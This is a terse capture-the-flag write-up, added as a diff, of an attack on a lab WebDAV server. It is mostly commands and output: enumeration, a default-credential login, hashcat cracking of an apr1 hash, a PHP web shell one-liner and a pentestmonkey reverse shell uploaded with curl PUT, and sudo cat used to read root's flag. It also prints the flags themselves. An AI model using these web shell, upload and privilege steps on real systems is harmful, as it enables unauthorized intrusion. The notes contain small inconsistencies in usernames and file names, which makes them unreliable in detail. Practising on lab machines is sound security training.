@@ -1,0 +1,103 @@
+nmap:
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+
+
+dirb:
++ http://10.10.186.243/index.html (CODE:200|SIZE:11321)                                                                      
++ http://10.10.186.243/server-status (CODE:403|SIZE:301) 
++ http://10.10.186.243/webdav (CODE:401|SIZE:460) 
+
+
+http://IP/webdav ----> http login request
+
+
+
+https://www.w3.org/Jigsaw/Doc/User/webdav.html
+---> jigsaw:jigsaw ---> fail
+
+https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html
+
+---> wammp:xammp ---> success
+
+Index of /webdav
+--->
+  passwd.dav
+  wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
+--->
+hashcat --help | grep -i "apr1"
+1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)                      | FTP, HTTP, SMTP, LDAP Server
+
+--->
+nano r.php  >>>> <?php system($_GET['c']);?>
+--->
+  echo "\$apr1\$Wm2VTkFL\$PVNRQv7kzqXQIHe14qKA91" > hash
+  hashcat -m 1600 -a 0 hash /usr/share/wordlists/rockyou.txt
+--->
+echo "wammp:xammp" | base64   >>>>   d2FtcHA6eGFtcHA=
+---> 
+curl -T r.php http://10.10.186.243/webdav/r.php --header "Authorization: Basic d2FtcHA6eGFtcHA="
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>201 Created</title>
+</head><body>
+<h1>Created</h1>
+<p>Resource /webdav/r.txt has been created.</p>
+<hr />
+<address>Apache/2.4.18 (Ubuntu) Server at 10.10.186.243 Port 80</address>
+</body></html>
+
+--->
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+nano r.php
+curl -T r.php http://10.10.186.243/webdav/r.php --header "Authorization: Basic d2FtcHA6eGFtcHA="
+
+--->
+cd /home
+ls
+
+merlin
+wampp
+
+ls /home/merlin
+user.txt
+
+cat /home/merlin/user.txt
+  449b40fe93f78a938523b7e4dcd66d2a
+--->
+
+ls -lah wampp
+empty
+
+---->
+
+stabilizer.sh
+  ---->
+  sudo -l 
+
+(ALL) NOPASSWD: /bin/cat
+
+sudo cat /root/root.txt
+101101ddc16b0cdf65ba0b8a7af7afa5
+
+
+  thanks for reading & happy hacking :)
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
